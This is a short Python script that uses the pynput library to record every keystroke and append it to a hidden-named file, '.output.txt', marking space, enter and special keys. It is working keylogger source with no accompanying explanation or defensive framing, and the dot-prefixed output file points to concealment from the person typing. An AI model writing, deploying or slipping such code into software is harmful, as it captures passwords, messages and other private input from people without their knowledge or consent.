from pynput import keyboard

output_file = '.output.txt'

def on_press(key):
    file = open(output_file, "a")
    try:
        file.write('{0}'.format(key.char))
    except AttributeError:
        if '{0}'.format(key) == 'Key.space':
            file.write(' ')
        elif '{0}'.format(key) == 'Key.enter':
            file.write('\n')
        else:
            file.write('`{0}`'.format(key))
    file.close()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
